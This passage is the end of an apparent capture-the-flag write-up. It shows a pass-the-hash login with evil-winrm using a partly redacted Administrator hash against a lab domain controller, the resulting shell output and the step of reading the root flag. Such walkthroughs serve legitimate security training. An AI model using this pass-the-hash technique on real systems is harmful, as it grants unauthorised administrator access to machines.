Using the hash we retrieved for the local **Administrator** with `evil-winrm`, we can obtain a shell and read the root flag located at `C:\Users\Administrator\Desktop\root.txt` to complete the room.

```console
$ evil-winrm -i k2rootdc.k2.thm -u 'Administrator' -H 15ec[REDACTED]4b90

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
k2\administrator
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>